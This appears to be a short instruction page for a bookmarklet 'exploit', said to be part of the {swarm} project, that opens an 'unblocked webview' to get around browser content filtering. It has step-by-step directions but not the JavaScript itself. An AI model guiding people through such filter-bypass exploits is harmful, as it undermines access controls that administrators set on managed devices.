Instructions:
-> Make a bookmarklet with the URL being the javascript above.
-> Double click on the opener button at the bottom of the page. This should open a new tab with a URL of about:blank#blocked.
-> On the newly opened tab, click on the bookmarklet that was just created.
-> The QuickView GUI should open, and you can now enter any URL to open it in an unblocked webview.
-> You can open another webview at any time by visiting https://www.google.com/# , and this will persist until a reboot. 
You can also drag the "QuickView Shortcut" button from below into your bookmarks bar for easy access. However, if you want to use the full GUI, you will have to use the website.

This exploit is part of the {swarm} project and utilizes a variation of the Point-Blank exploit.
